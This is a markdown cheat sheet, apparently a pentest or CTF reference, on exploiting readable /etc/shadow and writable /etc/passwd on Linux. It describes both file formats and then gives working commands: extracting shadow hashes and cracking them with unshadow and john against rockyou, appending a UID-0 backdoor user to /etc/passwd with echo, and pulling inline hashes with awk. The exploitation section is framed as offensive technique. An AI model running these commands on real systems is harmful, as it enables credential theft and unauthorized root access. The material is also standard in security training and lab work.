# Readable /etc/passwd & /etc/shadow

## Table of Contents

1. [Overview](#overview)
2. [/etc/passwd Format](#etcpasswd-format)
3. [/etc/shadow Format](#etcshadow-format)
4. [Exploitation](#exploitation)
   - [Readable /etc/shadow](#readable-etcshadow)
   - [Writable /etc/passwd](#writable-etcpasswd)
   - [Hash in /etc/passwd](#hash-in-etcpasswd)

---

## Overview

`/etc/passwd` is **world-readable** by default — every user can read it. It contains user account info.

`/etc/shadow` is normally readable only by **root**. It contains the actual password hashes. If you can read it, you can crack hashes offline. If you can write to `/etc/passwd`, you can inject a root account.

## /etc/passwd Format

```
username:x:UID:GID:comment:home:shell
```

| Field      | Example          | Description                                      |
|------------|------------------|--------------------------------------------------|
| username   | `root`           | Login name                                       |
| password   | `x`              | `x` = hash is in `/etc/shadow`. If a hash is here directly, it takes **priority** over shadow. |
| UID        | `0`              | User ID. `0` = root.                             |
| GID        | `0`              | Primary group ID                                 |
| comment    | `root`           | Description (GECOS field)                        |
| home       | `/root`          | Home directory                                   |
| shell      | `/bin/bash`      | Login shell. `/usr/sbin/nologin` = no login.     |

## /etc/shadow Format

```
username:hash:lastchanged:min:max:warn:inactive:expire
```

| Field       | Example                              | Description                          |
|-------------|--------------------------------------|--------------------------------------|
| username    | `root`                               | Login name                           |
| hash        | `$6$salt$hash...`                    | Password hash                        |
| lastchanged | `19500`                              | Days since epoch of last change      |

The hash field format: `$id$salt$hash`

| ID   | Algorithm       |
|------|-----------------|
| `$1$`  | MD5           |
| `$5$`  | SHA-256       |
| `$6$`  | SHA-512       |
| `$y$`  | yescrypt      |

Empty hash field (`::`) = **no password**, can `su` to that user without a password.

## Exploitation

### Readable /etc/shadow

If `/etc/shadow` is readable, extract hashes and crack offline.

```bash
# Check permissions
ls -la /etc/shadow

# Extract user:hash pairs
cat /etc/shadow | grep '\$' > hashes.txt

# Crack with john (unshadow combines passwd + shadow)
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
```

### Writable /etc/passwd

If `/etc/passwd` is writable, you can add a new root user directly.

```bash
# Generate a password hash
openssl passwd -6 -salt xyz mypassword

# Append a new root user (UID 0)
echo 'newroot:$6$xyz$hash...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su newroot
```

### Hash in /etc/passwd

On older or misconfigured systems, the password hash may be stored directly in `/etc/passwd` instead of `x`. If so, any user can read the hash and crack it offline.

```bash
# Look for entries where field 2 is not 'x' and not '*' or '!'
cat /etc/passwd | awk -F: '$2 != "x" && $2 != "*" && $2 != "!" {print $1 ":" $2}'
```
